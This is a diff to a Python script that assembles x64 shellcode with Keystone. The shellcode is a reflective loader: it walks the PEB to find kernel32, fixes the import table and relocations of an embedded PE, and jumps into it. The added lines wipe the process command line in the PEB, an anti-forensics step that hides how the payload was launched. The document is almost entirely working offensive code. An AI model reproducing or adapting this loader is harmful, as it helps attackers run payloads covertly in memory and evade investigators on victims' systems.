@@ -3,11 +3,30 @@ from keystone import *
 import sys
 
 
+
+#  Remove argument line
+#  ProcessParameters = PEB + 0x20
+#  CommandLine = ProcessParameters + 0x70
+#  Buffer = CommandLine + 0x8 (wchar)
+#  Length = CommandLine + 0x0 (word)
+#
+
 CODE = (
 "find_kernel32:"
 " sub rsp, 0x8;"
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
+
+
+" mov rsi, [rax + 0x20];"		# RSI = Address of ProcessParameter
+" add rsi, 0x70;"			# RSI points to CommandLine member
+" mov byte ptr [rsi], 0;"		# Set Length to 0
+" mov rsi, [rsi+8];"			# RSI points to the string
+" mov byte ptr [rsi], 0;"		# Set Buffer to 0 0x13 bytes 
+
+
+
+
 " mov rsi,[rax+0x18];"			# RSI = Address of _PEB_LDR_DATA
 " mov rsi,[rsi + 0x30];"		# RSI = Address of the InInitializationOrderModuleList
 " mov r9, [rsi];"			# python.exe
@@ -75,7 +94,7 @@ CODE = (
 "fix_iat:"  				# Init necessary variable for fixing IAT
 " xor rsi, rsi;"
 " xor rdi, rdi;"
-" lea rbx, [rip+0x1fe];"		# RBX points to PE part of shellcode, now 346 bytes in total
+" lea rbx, [rip+0x1fc];"		# RBX points to PE part of shellcode, now 346 bytes in total
 " xor rax, rax;"
 " mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
 " add rax, rbx;"          		# RAX points to NT Header
@@ -277,18 +296,18 @@ CODE = (
 " add rsi, 2;"				# Directly skip this entry
 
 "next_block:"
-" add rsi, 4;"				# Jump to the block size field of next block
+#" add rsi, 2;"				# Jump to the block size field of next block
 " jmp loop_reloc_block;"
 
 "reloc_fixed_end:"
 " sub rsp,8;"                   		# 
-#" nop;"
-#" nop;"
-#" nop;"
-#" nop;"
 " nop;"
 " nop;"
 " nop;"
+" nop;"
+" nop;"
+#" nop;"
+#" nop;"
 #" nop;"
 " jmp r15;"
 )
